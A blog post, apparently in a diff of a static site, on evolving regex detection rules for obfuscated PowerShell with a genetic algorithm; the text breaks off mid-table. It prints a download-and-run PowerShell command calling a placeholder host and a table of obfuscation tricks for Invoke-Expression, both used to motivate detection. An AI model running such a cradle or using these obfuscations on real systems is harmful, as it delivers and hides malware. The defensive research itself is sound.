@@ -1,0 +1,1085 @@
+<!doctype html>
+<html
+  lang="en-uk"
+  dir="ltr"
+  class="h-full">
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="language" content="en-uk">
+<script>
+  
+  (function () {
+    const storedTheme = localStorage.getItem("theme");
+    const systemPrefersLight = window.matchMedia("(prefers-color-scheme: light)").matches;
+    const theme = storedTheme || (systemPrefersLight ? "light" : "dark");
+    document.documentElement.setAttribute("data-theme", theme);
+  })();
+</script>
+<title>Why Mario inspired me to poke around genetic regex evolution | Blog</title>
+<meta
+  name="description"
+  content="
+    Can we get a Model to Evolve Its Own Detection Rules? Prologue: MarI/O inspiration Many moons ago I along with 11m other people watched a fascinating video on …
+  
+  ">
+
+
+
+
+
+
+<link rel="canonical" href="https://Pr0kythera.github.io/posts/genetic-regex/">
+
+<meta name="robots" content="index, follow">
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="Why Mario inspired me to poke around genetic regex evolution | Blog">
+<meta property="og:description" content="Can we get a Model to Evolve Its Own Detection Rules? Prologue: MarI/O inspiration Many moons ago I along with 11m other people watched a fascinating video on …">
+<meta property="og:url" content="https://Pr0kythera.github.io/posts/genetic-regex/">
+<meta property="og:site_name" content="Blog"><meta property="og:image" content="https://example.com/avatar.jpg">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630"><meta property="article:published_time" content="2026-01-18T23:54:51Z">
+  <meta
+    property="article:modified_time"
+    content="2026-01-18T23:54:51Z">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Why Mario inspired me to poke around genetic regex evolution | Blog">
+<meta name="twitter:description" content="Can we get a Model to Evolve Its Own Detection Rules? Prologue: MarI/O inspiration Many moons ago I along with 11m other people watched a fascinating video on …"><meta name="twitter:image" content="https://example.com/avatar.jpg">
+
+<script type="application/ld+json">
+
+
+
+
+
+
+
+
+
+
+"{\"@context\":\"https://schema.org\",\"@type\":\"BlogPosting\",\"author\":{\"@type\":\"Person\",\"email\":\"contact.prokythera@gmail.com\",\"name\":\"Blog\"},\"dateModified\":\"2026-01-18T23:54:51Z\",\"datePublished\":\"2026-01-18T23:54:51Z\",\"description\":\"Can we get a Model to Evolve Its Own Detection Rules? Prologue: MarI/O inspiration Many moons ago I along with 11m other people watched a fascinating video on …\",\"headline\":\"Why Mario inspired me to poke around genetic regex evolution\",\"image\":\"https://example.com/avatar.jpg\",\"mainEntityOfPage\":{\"@id\":\"https://Pr0kythera.github.io/posts/genetic-regex/\",\"@type\":\"WebPage\"},\"publisher\":{\"@type\":\"Organization\",\"logo\":{\"@type\":\"ImageObject\",\"url\":\"https://example.com/avatar.jpg\"},\"name\":\"Blog\"}}"</script>
+
+
+
+  
+  
+  
+    
+  
+  
+<script type="application/ld+json">"{\"@context\":\"https://schema.org\",\"@type\":\"BreadcrumbList\",\"itemListElement\":[{\"@type\":\"ListItem\",\"item\":\"https://Pr0kythera.github.io/\",\"name\":\"Blog\",\"position\":1},{\"@type\":\"ListItem\",\"item\":\"https://Pr0kythera.github.io/posts/\",\"name\":\"Posts\",\"position\":2},{\"@type\":\"ListItem\",\"item\":\"https://Pr0kythera.github.io/posts/genetic-regex/\",\"name\":\"Why Mario inspired me to poke around genetic regex evolution\",\"position\":3}]}"</script>
+
+
+
+
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link
+  href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&family=Outfit:wght@400;500;600;700;800;900&family=Space+Grotesk:wght@400;500;600;700&display=swap"
+  rel="stylesheet">
+
+
+<link
+  rel="stylesheet"
+  href="/css/theme.min.86a32b729f656fc6c119ed69193950db815a3ad9fdc967b32c76d602f11449a4.css"
+  integrity="sha256-hqMrcp9lb8bBGe1pGTlQ24FaOtn9yWezLHbWAvEUSaQ=">
+
+<link
+    rel="stylesheet"
+    href="/css/syntax-dark.min.b01037e5609e6260b74d6fcdd6d5131e8dcbc4d46d6ef4bfbe5a60bdfc1a9f30.css"
+    integrity="sha256-sBA35WCeYmC3TW/N1tUTHo3LxNRtbvS/vlpgvfwanzA="
+    id="syntax-dark-theme"
+    class="syntax-theme"><link
+    rel="stylesheet"
+    href="/css/syntax-light.min.9602bc2fcef52b4c62e05eae14b48ba428e114f116e993e504d83ed5a3aeda98.css"
+    integrity="sha256-lgK8L871K0xi4F6uFLSLpCjhFPEW6ZPlBNg&#43;1aOu2pg="
+    id="syntax-light-theme"
+    class="syntax-theme"
+    disabled><script>
+  
+  (function () {
+    const storedTheme = localStorage.getItem("theme");
+    const systemPrefersLight = window.matchMedia("(prefers-color-scheme: light)").matches;
+    const theme = storedTheme || (systemPrefersLight ? "light" : "dark");
+
+    const syntaxDark = document.getElementById("syntax-dark-theme");
+    const syntaxLight = document.getElementById("syntax-light-theme");
+
+    if (theme === "light") {
+      if (syntaxDark) syntaxDark.disabled = true;
+      if (syntaxLight) syntaxLight.disabled = false;
+    } else {
+      if (syntaxDark) syntaxDark.disabled = false;
+      if (syntaxLight) syntaxLight.disabled = true;
+    }
+
+    
+    const observer = new MutationObserver(() => {
+      const currentTheme = document.documentElement.getAttribute("data-theme");
+      if (currentTheme === "light") {
+        if (syntaxDark) syntaxDark.disabled = true;
+        if (syntaxLight) syntaxLight.disabled = false;
+      } else {
+        if (syntaxDark) syntaxDark.disabled = false;
+        if (syntaxLight) syntaxLight.disabled = true;
+      }
+    });
+
+    observer.observe(document.documentElement, {
+      attributes: true,
+      attributeFilter: ["data-theme"],
+    });
+  })();
+</script>
+
+
+
+
+<link
+  rel="stylesheet"
+  href="/css/bundle.min.948f22fa5116b6eb619af6ddf3f031cb443efd254975d5d5c20832145ef0c86c.css"
+  integrity="sha256-lI8i&#43;lEWtuthmvbd8/Axy0Q&#43;/SVJddXVwggyFF7wyGw=">
+
+
+
+
+
+<link rel="icon" type="image/x-icon" href="/favicon.ico">
+<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">
+
+<link rel="icon" type="image/png" href="/favicon.png">
+
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon/logo-transparent/favicon-32x32.png">
+
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon/logo-transparent/favicon-16x16.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/favicon/logo-transparent/apple-touch-icon.png">
+<link
+  rel="icon"
+  type="image/png"
+  sizes="192x192"
+  href="/favicon/logo-transparent/android-chrome-192x192.png">
+<link
+  rel="icon"
+  type="image/png"
+  sizes="512x512"
+  href="/favicon/logo-transparent/android-chrome-512x512.png">
+<link rel="manifest" href="/favicon/logo-transparent/site.webmanifest">
+
+
+
+
+  
+
+
+
+
+  </head>
+  <body class="flex flex-col min-h-screen">
+    <a href="#main-content" class="skip-to-main" aria-label="Skip to main content"
+      >Skip to main content</a
+    >
+    <header class="sticky-header">
+      <div class="header-container">
+        <nav class="header-nav" role="navigation" aria-label="Main navigation">
+  <div class="header-content">
+    <div class="header-logo">
+      <a href="/" class="logo-link" aria-label="Home - Blog">
+        Blog
+      </a>
+    </div>
+
+    <div class="header-menu">
+      <ul class="menu-list">
+  
+    <li class="menu-item">
+      <a
+        href="/posts/"
+        class="menu-link ">
+        Posts
+      </a>
+    </li>
+  
+</ul>
+
+
+
+      <button id="search-toggle" class="search-toggle" aria-label="Search" type="button">
+        <svg class="search-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+        </svg>
+      </button>
+
+      <button id="theme-toggle" class="theme-toggle" aria-label="Toggle theme" type="button">
+  <svg class="icon-sun" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+    <path
+      stroke-linecap="round"
+      stroke-linejoin="round"
+      stroke-width="2"
+      d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path>
+  </svg>
+  <svg class="icon-moon" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+    <path
+      stroke-linecap="round"
+      stroke-linejoin="round"
+      stroke-width="2"
+      d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path>
+  </svg>
+</button>
+
+    </div>
+  </div>
+</nav>
+
+      </div>
+    </header>
+
+    <main id="main-content" class="flex-1" role="main">
+      
+  <div class="single-post-wrapper">
+    <article class="single-post">
+      
+
+
+
+
+
+
+
+      <header class="post-header">
+        <h1 class="post-title-main">Why Mario inspired me to poke around genetic regex evolution</h1>
+
+        
+
+        <div class="post-meta">
+  <div class="post-meta-info">
+    <time datetime="2026-01-18T23:54:51Z" class="post-date">
+      <svg class="meta-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path
+          stroke-linecap="round"
+          stroke-linejoin="round"
+          stroke-width="2"
+          d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
+      </svg>
+      January 18, 2026
+    </time>
+
+    <span class="meta-separator">•</span>
+
+    
+      <span class="post-word-count">
+        <svg class="meta-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
+        </svg>
+        4430 words
+      </span>
+    
+
+    
+      <span class="meta-separator">•</span>
+      <span class="post-reading-time">
+        <svg class="meta-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+        </svg>
+        21 min
+      </span>
+    
+  </div>
+
+  
+</div>
+
+      </header>
+
+      <div class="post-content-main">
+        <h1 id="can-we-get-a-model-to-evolve-its-own-detection-rules">Can we get a Model to Evolve Its Own Detection Rules?</h1>
+<hr>
+<h2 id="prologue-mario-inspiration">Prologue: MarI/O inspiration</h2>
+<p>Many moons ago I along with 11m other people watched a fascinating video on teaching a computer to play Mario by itself. Or to be more accurate the computer evolving itself to learn how to play Mario.
+(SethBling, 2015youtube.com/watch?v=qv6UVOQ0F44).</p>
+<p>The computer was handed the controls to Super Mario World and then instructed that in this scenario: going further to the right is a good thing. No details about enemies, jumping, or how the game works. At first it twitches and dies at the first Goomba. But determined it runs thousands of attempts across many generations, keeping and combining whatever got a little furtherand after enough generations, it plays the level. Nobody programmed it how. It <em>evolved</em> the skill.</p>
+<p>That was my first introduction to genetic algorithms, and the idea stuck: a computer finding a solution by trial, selection and &ldquo;breeding&rdquo;, rather than being told the answer. For a long time I&rsquo;ve wanted to point that same idea the field of detection engineering. To ask a reasonable question: <strong>could a computer evolve its own detection rules for the thing that defeats so many of oursobfuscated PowerShell?</strong></p>
+<p>Nothing better than spending an evening theorising how I can put myself out of a job.</p>
+<p>Two things make <em>attempting</em> that far easier in 2026 than in 2015. First, you no longer need to be a machine-learning specialist to build the machinery, reason about the results, or dodge the classic traps: a capable LLM lowers the barrier to entry enormouslythis whole project was hand-built and explained step by step with Claude acting as pair-programmer and tutor. Which is exactly how I feel I get the best use out of it, learn and validate what gets produced. Second, that shifts the interesting work away from &ldquo;can I even get it running&rdquo; and onto &ldquo;what does it actually tell me&rdquo;</p>
+<hr>
+<h2 id="0-the-whole-story-in-a-few-sentences">0. The whole story in a few sentences</h2>
+<p>Attackers obfuscate PowerShell so that simple &ldquo;look for this exact string&rdquo; detections miss it. We asked a blunt question: instead of a human hand-writing detection rules, could a computer <em>evolve</em> thembreed them like livestock, keeping the ones that catch the most malicious text? It half-works: the computer breeds a rule that beats the baseline, but it hits two separate walls on the way to the quality a skilled analyst would hand-write.</p>
+<p><strong>Wall 1</strong> is getting stuck on a &ldquo;good enough&rdquo; rule: we got past it with more time, and then far more reliably and ~4x faster by borrowing a selection trick from the research literature (lexicase selection) that protects specialists.</p>
+<p><strong>Wall 2</strong> is the one that remains: in our case the computer cannot assemble the <em>structure</em> needed to see through the obfuscation, even when we hand it the exact missing piece. We pinned that down by ruling out every other explanation, one experiment at a time. That tells defenders something useful about where &ldquo;AI writes your detections&rdquo; helps and where it quietly falls over.</p>
+<hr>
+<h2 id="1-the-problem-every-detection-engineer-already-knows">1. The problem every detection engineer already knows</h2>
+<p>A malicious PowerShell download-and-run command might look like this:</p>
+<pre tabindex="0"><code>powershell -nop -w hidden -Command &#34;Invoke-Expression ((New-Object Net.WebClient).DownloadString(&#39;http://evil.example/p&#39;))&#34;
+</code></pre><p>The tell-tale pieces</p>
+<ul>
+<li><code>Invoke-Expression</code> (run this text as code)</li>
+<li><code>DownloadString</code> (pull it off the internet),</li>
+<li><code>-EncodedCommand</code> / <code>-w hidden</code> (launcher flags)</li>
+</ul>
+<p>These are the things a detection looks for.</p>
+<p>Attackers know that, so they <strong>obfuscate</strong>: disguise the command so it still runs but no longer <em>reads</em> like the thing your rule searches for. A few real techniques, all of which keep the command working:</p>
+<table>
+	<thead>
+			<tr>
+					<th>Technique</th>
+					<th><code>Invoke-Expression</code> becomes&hellip;</th>
+					<th>Still runs?</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Case randomisation</td>
+					<td><code>InVoKe-ExPreSsIoN</code></td>
+					<td>yes</td>
+			</tr>
+			<tr>
+					<td>Backtick insertion</td>
+					<td><code>I`nvoke-Expres`sion</code></td>
+					<td>yes</td>
+			</tr>
+			<tr>
+					<td>String concatenation</td>
+					<td><code>('Inv'+'oke-Expr'+'ession')</code></td>
+					<td>yes</td>
+			</tr>
+			<tr>
+					<td>Alias</td>
+					<td><code>iex</code></td>
+					<td>yes</td>
+			</tr>
+			<tr>
+					<td>Format-operator reorder</td>
+					<td><code>(&quot;{1}{0}&quot;-f'ession','Invoke-Expr')</code></td>
+					<td>yes</td>
+			</tr>
+			<tr>
+					<td>Base64 <code>-EncodedCommand</code></td>
+					<td>a blob of base64</td>
+					<td>yes</td>
+			</tr>
+	</tbody>
+</table>
+<p>The first four still contain the letters <code>i</code>, <code>e</code>, <code>x</code> <strong>in order</strong>, just with junk sprinkled
+between them. The last two genuinely scramble or hide the letters.</p>
+<p>A plain string search (<code>grep &quot;Invoke-Expression&quot;</code>) catches <em>none</em> of these except the untouched
+original. A skilled analyst can write a cleverer search that ignores the junk. <strong>The question of this
+project: can we get a computer to <em>invent</em> that cleverer search on its own?</strong></p>
+<hr>
+<h2 id="2-the-tool-were-evolving-a-regex">2. The tool we&rsquo;re evolving: a regex</h2>
+<p>A <strong>regex</strong> (regular expression) is a search pattern think of it as a much smarter Ctrl-F. Instead
+of matching one fixed string, it matches a <em>shape</em>. Most people in security have written one.</p>
+<p>The clever anti-obfuscation trick, written as a regex, is to allow &ldquo;junk&rdquo; between each required
+letter. Where a naive search is just <code>iex</code>, an analyst writes something like:</p>
+<pre tabindex="0"><code>i[`&#39;&#34;+\s]*e[`&#39;&#34;+\s]*x
+</code></pre><p>Read that as: &ldquo;an <code>i</code>, then any amount of backtick/quote/plus/space junk, then an <code>e</code>, then more
+junk, then an <code>x</code>.&rdquo; That one pattern catches <code>iex</code>, <code>i`ex</code>, <code>('i'+'ex')</code>, and so on. We call this
+<strong>noise-skipping</strong>, and the junk characters (backtick, quotes, <code>+</code>, whitespace) we call <strong>noise</strong>.</p>
+<p>So the thing we want the computer to produce is a regex. The question is how a computer could
+possibly <em>invent</em> a good one without us telling it the answer.</p>
+<hr>
+<h2 id="3-evolution-applied-to-search-rules-no-maths-promise">3. Evolution, applied to search rules (no maths, promise)</h2>
+<p>The technique is a <strong>genetic algorithm</strong>the exact method behind the MarI/O video from the
+prologue. Forget the name; the idea is animal breeding.</p>
+<p>If you want faster racehorses, you don&rsquo;t calculate the perfect horse. You:</p>
+<ol>
+<li>Start with a <strong>population</strong> a field full of random horses.</li>
+<li><strong>Race</strong> them and keep the fastest (<strong>selection</strong>).</li>
+<li><strong>Breed</strong> the winners together, mixing their traits (<strong>crossover</strong>).</li>
+<li>Occasionally a foal is born with a <strong>random change</strong> (<strong>mutation</strong>).</li>
+<li>Repeat for many <strong>generations</strong>. The field gets faster over time.</li>
+</ol>
+<p>Now swap &ldquo;horse&rdquo; for &ldquo;regex&rdquo; and &ldquo;race time&rdquo; for &ldquo;how well it catches the malicious text.&rdquo; That&rsquo;s the
+entire method:</p>
+<ul>
+<li><strong>Population</strong>: a few hundred randomly-generated regexes.</li>
+<li><strong>Fitness</strong> (the race): a score for how well each regex catches the malicious strings without
+firing on benign ones. The higher the score, the &ldquo;fitter&rdquo; the regex. The scoring recipe is called
+the <strong>fitness function</strong> it&rsquo;s the judge, and <em>everything</em> the algorithm does is in service of
+scoring higher on it. (This matters a lot later.)</li>
+<li><strong>Selection</strong>: keep the high-scorers.</li>
+<li><strong>Crossover</strong>: take two good regexes, swap a chunk of one into the other, hope the child is better.</li>
+<li><strong>Mutation</strong>: randomly tweak a regex change a character, add a repeat, etc.</li>
+<li><strong>Generations</strong>: do this 30-200 times and watch the best score climb.</li>
+</ul>
+<p>No one tells the computer what a good regex looks like. It only ever gets a <em>score</em>, and it climbs -
+exactly like MarI/O was only ever told &ldquo;further right is better&rdquo; and never how to jump. When the
+&ldquo;creatures&rdquo; being evolved are themselves little programs (here, regexes), the field calls it
+<strong>genetic programming</strong>, but it&rsquo;s the same breeding loop.</p>
+<p>You can watch ours do it: <code>results/phase2/talk/evolution.gif</code> is our own MarI/O-style time lapse, but
+the creature is a regex and the &ldquo;score&rdquo; is how much malicious text it catches. It flails, plateaus for
+dozens of generations matching useless fragments, then suddenly breaks through, the same arc as the
+Mario run, just a tiny bit less cute.</p>
+
+
+
+
+
+
+
+
+<blockquote class="blockquote-regular">
+  <p><strong>Why evolution and not &ldquo;just use AI / an LLM?&rdquo;</strong> Two reasons. First, an evolved regex is a <em>plain
+regex</em> you can read it, drop it into your SIEM, and run it anywhere, with no model to host.
+Second, the point was to <em>understand</em> the method by building it by hand, and to get an
+answer about how far it gets, not to ship a product.</p>
+
+</blockquote>
+<hr>
+<h2 id="4-a-fair-test-bench-this-is-where-most-it-works-demos-cheat">4. A fair test bench (this is where most &ldquo;it works!&rdquo; demos cheat)</h2>
+<p>An evolution run is only as realistic as the scoreboard. Three things make ours trustworthy.</p>
+<h3 id="41-labelled-defanged-data">4.1 Labelled, defanged data</h3>
+<p>We generate the malicious examples ourselves from templates, applying the obfuscation techniques
+above at <strong>six escalating levels</strong> (L0 = untouched, up to L5 = heavily scrambled / base64). Because
+<em>we</em> applied the obfuscation, we know exactly where each indicator&rsquo;s characters ended up no
+guessing. Everything points at <code>example.invalid</code> and carries benign markers; nothing executes. We
+also generate a <strong>benign corpus</strong> of normal admin commands, including deliberately tricky
+&ldquo;hard negatives&rdquo; (e.g. a legitimate <code>iex</code>, or a real <code>-EncodedCommand</code> that sysadmins genuinely use)
+so the detector has to be <em>discriminating</em>, not just trigger-happy.</p>
+<h3 id="42-two-yardsticks-the-floor-and-the-expert-ceiling">4.2 Two yardsticks: the floor and the expert ceiling</h3>
+<p>You can&rsquo;t tell if a score is good without something to compare against. We use two <strong>baselines</strong>
+rules we did <em>not</em> evolve:</p>
+<ul>
+<li><strong>keyword</strong> the simplest possible rule: the literal indicator as a plain string (<code>iex</code>,
+<code>invoke-expression</code>). Catches the un-obfuscated spelling and nothing else. This is the <strong>floor</strong>:
+if evolution can&rsquo;t beat this, it has learned nothing.</li>
+<li><strong>expert</strong> the noise-skipping pattern from Section 2, the best a skilled analyst who understands
+the obfuscation would hand-write. This is the <strong>ceiling</strong>: it catches everything that is still
+<em>visible</em> in the text, so no raw-text regex can beat it.</li>
+</ul>
+<p>Every evolved regex is judged against both, on the same data. &ldquo;It worked&rdquo; has to mean &ldquo;it beat the
+floor and approached the ceiling,&rdquo; not &ldquo;it got a high-looking number.&rdquo;</p>
+
+
+
+
+
+
+
+
+<blockquote class="blockquote-regular">
+  <p><strong>A free trick we leaned on:</strong> the expert ceiling is pinned at a perfect score <em>by construction</em>.
+So whenever the <em>keyword</em> baseline&rsquo;s score swung around between data splits, that was a thermometer
+telling us our data was unevenly split a problem we caught and fixed before trusting any result.</p>
+
+</blockquote>
+<h3 id="43-score-the-characters-not-just-yesno-how-we-stopped-it-cheating">4.3 Score the characters, not just yes/no (how we stopped it cheating)</h3>
+<p>Our first attempt scored each regex on a simple yes/no: did it fire on a malicious command or not?
+It scored ~0.98 suspiciously great. On inspection, <strong>it was cheating</strong>: because our malicious
+commands all happened to contain launcher flags like <code>-ExecutionPolicy</code>, the regex learned to fire on
+the substring <code>-e</code> and ignore the actual indicator entirely. It wasn&rsquo;t detecting <code>Invoke-Expression</code>;
+it was detecting &ldquo;this command has a flag,&rdquo; which every command in the set had.</p>
+<p>This is <strong>reward hacking</strong> (also &ldquo;specification gaming&rdquo;), and detection engineers see it constantly:
+a rule that scores great in the lab because it latched onto a coincidence, then fails in the wild.
+The fix was to change <em>what we measure</em>. Instead of yes/no, the regex must <strong>highlight the exact
+characters</strong> of the indicator like a human analyst drawing a box around the suspicious bit. Now:</p>
+<ul>
+<li>matching the real indicator&rsquo;s characters = points <strong>for</strong> you;</li>
+<li>matching the wrong characters (a flag, filler) = points <strong>against</strong> you.</li>
+</ul>
+<p>Suddenly the <code>-e</code> cheat is worthless: those are the wrong characters. This is called <strong>span
+extraction</strong>, and it dissolved the cheating by construction rather than by us endlessly patching the
+data. We score it with three standard numbers, in plain terms:</p>
+<ul>
+<li><strong>Precision</strong>: of the characters the regex highlighted, what fraction were actually indicator
+characters? (Low precision = noisy, lots of false highlights = alert fatigue.)</li>
+<li><strong>Recall</strong>: of the indicator characters that were there to catch, what fraction did it highlight?
+(Low recall = misses = blind spots.)</li>
+<li><strong>F1</strong>: a single balanced blend of the two (1.0 = perfect, 0 = useless). We quote F1 as the
+headline and precision/recall when the story is in the trade-off.</li>
+</ul>
+<p>(We deliberately avoid plain &ldquo;accuracy.&rdquo; On lopsided data most text is <em>not</em> an indicator a rule
+that flags nothing scores 95%+ accuracy while catching nothing. Precision/recall/F1 don&rsquo;t let a
+do-nothing rule look good.)</p>
+<hr>
+<h2 id="5-what-happened-a-detective-story-in-seven-experiments">5. What happened: a detective story in seven experiments</h2>
+<p>Short version: evolution gets <em>partway</em>, then stalls at a hard ceiling of about <strong>0.70 F1</strong> above
+the floor (0.61) but nowhere near the expert ceiling (1.0). The rest of the project was pure
+detective work: <em>why</em> does it stall? (Spoiler: there are two separate walls, and experiments 4-7 are
+about telling them apart.) We changed one thing at a time (an <strong>ablation</strong> the same
+discipline as troubleshooting by toggling one variable) until the cause was cornered.</p>
+<h3 id="exp-1-the-first-run-it-stalls-below-the-baseline">Exp 1 The first run: it stalls <em>below</em> the baseline</h3>
+<p>Evolving a rule for the <code>Invoke-Expression</code> indicator, the best evolved regex scored <strong>0.49</strong>
+<em>worse</em> than the keyword floor (0.61), and far from expert (1.0). Reading the evolved regex explained
+it: it had latched onto common <em>fragments</em> like <code>exp</code> (from &ldquo;ex<strong>p</strong>ression&rdquo;) and <code>sio</code> (from
+&ldquo;expre<strong>ssio</strong>n&rdquo;) little chunks that appear inside the real word instead of learning the word
+itself. It never once highlighted a <em>complete</em> indicator.
+<em>(Figure: <code>results/phase2/exp1_EXEC_curve.png</code>the score climbs smoothly then flattens.)</em></p>
+<h3 id="exp-2-is-it-the-ingredients-no">Exp 2 Is it the ingredients? (No.)</h3>
+<p>The algorithm builds regexes out of a starter kit of &ldquo;building blocks.&rdquo; We suspected the kit which
+includes those handy fragments was luring it into the fragment trap. So we swapped the data-derived
+kit for a kit of random characters. Result: it did <strong>worse</strong>, not better, and still got stuck on
+fragments. So the fragments aren&rsquo;t the villain; good building blocks help a bit, but the stall is
+something deeper. <em>(Figure: <code>exp2_EXEC_terminals.png</code>.)</em></p>
+<h3 id="exp-3-is-it-our-keep-it-short-rule-no">Exp 3 Is it our &ldquo;keep it short&rdquo; rule? (No.)</h3>
+<p>We add a small penalty for long, bloated regexes (a standard tactic to stop them ballooning). Maybe
+that penalty was discouraging the longer noise-skipping pattern? We swept the penalty from off to
+double. It made <strong>no meaningful difference</strong>, and surprisingly turning it off did <em>not</em> cause
+bloat. (Bloat needs a reason to grow; sitting on a plateau, the regexes had none.) Penalty ruled out.
+<em>(Figure: <code>exp3_EXEC_lengthpenalty.png</code>.)</em></p>
+<h3 id="exp-4-does-it-just-need-more-time-partly-a-breakthrough">Exp 4 Does it just need more time? (Partly a breakthrough!)</h3>
+<p>We gave it <strong>4x more generations</strong>. One run in three broke through: it beat the keyword floor
+(<strong>0.68 &gt; 0.61</strong>) and, for the first time, highlighted <strong>27 complete indicators</strong>. Watching its
+score over time told the story it sat flat at ~0.50 for <em>seventy</em> generations, then a lucky
+breeding event in the final ten generations jumped it to 0.64. <strong>So the first wall isn&rsquo;t infinitely
+high; it&rsquo;s a valley the algorithm can occasionally tunnel through, given enough attempts.</strong> The
+breakthrough rule used <code>\w+</code> (regex for &ldquo;a run of letters/digits&rdquo;) to span across letters a
+<em>partial</em> noise-skip. <em>(Figure: <code>exp4_EXEC_budget.png</code>.)</em></p>
+<h3 id="exp-5-can-we-make-the-breakthrough-reliable-yes-with-restarts">Exp 5 Can we make the breakthrough reliable? (Yes with restarts.)</h3>
+<p>A breakthrough that happens &ldquo;sometimes&rdquo; isn&rsquo;t a detection strategy. But <em>sometimes</em> is measurable. We
+ran many independent attempts and measured the <strong>escape rate</strong>: ~<strong>36%</strong> per run at the longer budget,
+rising to ~<strong>56%</strong> with more time. That turns luck into engineering if each run succeeds 36% of the
+time, running <strong>7 in parallel</strong> gives you &gt;95% odds that at least one breaks through. We have the
+machinery to run them in parallel, so reliable escape is just &ldquo;best of N attempts.&rdquo; <em>(Figure:
+<code>exp5_EXEC_escape.png</code>.)</em></p>
+<p><strong>But</strong> every single successful run topped out at the same ~0.70 using that <code>\w+</code> trick. And <code>\w</code>
+matches letters and digits, <strong>not</strong> the backtick/quote/<code>+</code> noise. So it sails through case changes but
+is blind to <code>i`ex</code> and <code>('i'+'ex')</code>. That&rsquo;s the <strong>second wall</strong>, and nothing had touched it.</p>
+<h3 id="exp-6-the-second-wall-missing-materials-or-missing-skill-skill">Exp 6 The second wall: missing <em>materials</em>, or missing <em>skill</em>? (Skill.)</h3>
+<p>The gap from 0.70 to the 1.0 ceiling is entirely the noise-skipping the expert does and evolution
+never discovers. Two possible reasons:</p>
+<ul>
+<li><strong>Materials</strong> the algorithm literally cannot build the noise class. (True-ish: the backtick
+character wasn&rsquo;t even in its vocabulary.)</li>
+<li><strong>Assembly</strong> even <em>with</em> the right part, it can&rsquo;t put it together in the needed structure.</li>
+</ul>
+<p>So we handed it the exact missing Lego brick a ready-made noise class <code>[`'&quot;+]</code> and gave it
+extra room to build (we discovered a <em>third</em> wall here: the project&rsquo;s size limits were quietly
+forbidding a full noise-skipping rule for a long word like &ldquo;invoke-expression,&rdquo; so we lifted them).</p>
+<p>Result: <strong>it didn&rsquo;t help.</strong> Every brick-equipped run <em>did pick up and use</em> the noise class and
+still plateaued at ~0.70, no better than the runs without it. The giveaway is <em>how</em> it used the
+brick: it sprinkled noise classes chaotically all over the pattern, instead of placing one <em>cleanly
+between each pair of letters</em> the way the expert does. <em>(Figure: <code>exp6_EXEC_noise.png</code>.)</em></p>
+<p><strong>Verdict: assembly, not materials.</strong> The algorithm could reach the halfway skeleton, and could even
+hold the right part in its hand but it could not assemble the regular, repeating
+<code>letter . noise . letter . noise . letter</code> structure that seeing through obfuscation requires.</p>
+<h3 id="interludehas-anyone-solved-stuck-on-a-good-enough-answer-before">Interludehas anyone solved &ldquo;stuck on a good-enough answer&rdquo; before?</h3>
+<p>Yesit is one of the oldest problems in evolutionary computing, and the MarI/O video from the
+prologue is built on one of the classic answers. MarI/O used an algorithm called <strong>NEAT</strong> (2002). Its
+core idea is easy to state in security terms:</p>
+
+
+
+
+
+
+
+
+<blockquote class="blockquote-regular">
+  <p>A brand-new, half-finished idea almost always performs <em>worse</em> than the mature incumbent, so a
+naive &ldquo;keep the best scorer&rdquo; rule kills it before it has time to improve.</p>
+
+</blockquote>
+<p>That is our wall almost exactly: a half-built noise-skipping rule scores <em>lower</em> than the fragment
+rule we already have, so evolution discards it. NEAT&rsquo;s fix is <strong>speciation</strong>sort the population
+into &ldquo;families&rdquo; of similar individuals and make them compete mainly <em>within</em> their family, so a new
+design is only judged against its own kind while it matures. Think of it as running a pilot program
+instead of benchmarking a new detection against a tuned production rule on day one.</p>
+<p>NEAT is 24 years old, though, so rather than reach for it by reflex we did a short literature review
+of what the field has developed since. Four ideas stood out, each answering &ldquo;how do you keep promising
+but currently-weak candidates alive?&rdquo; (full notes, with source quality, are in
+<code>docs/reading_notes.md</code>):</p>
+<table>
+	<thead>
+			<tr>
+					<th>Idea (plain English)</th>
+					<th>Official name</th>
+					<th>Relevance to us</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Judge candidates on <em>individual test cases</em>, not their average, so specialists survive</td>
+					<td><strong>Lexicase selection</strong> (2014+)</td>
